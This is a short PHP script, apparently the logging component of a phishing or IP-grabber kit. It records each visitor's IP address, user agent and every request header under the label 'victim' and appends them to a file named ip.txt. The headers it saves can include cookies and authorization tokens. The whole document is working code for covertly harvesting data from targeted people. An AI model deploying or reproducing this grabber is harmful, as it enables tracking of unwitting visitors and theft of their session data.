<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR'];
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = '../ip.txt';
$victim = PHP_EOL."IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser . PHP_EOL);

foreach (getallheaders() as $name => $value) {
    fwrite($fp, "$name: $value".PHP_EOL);
}

fclose($fp);
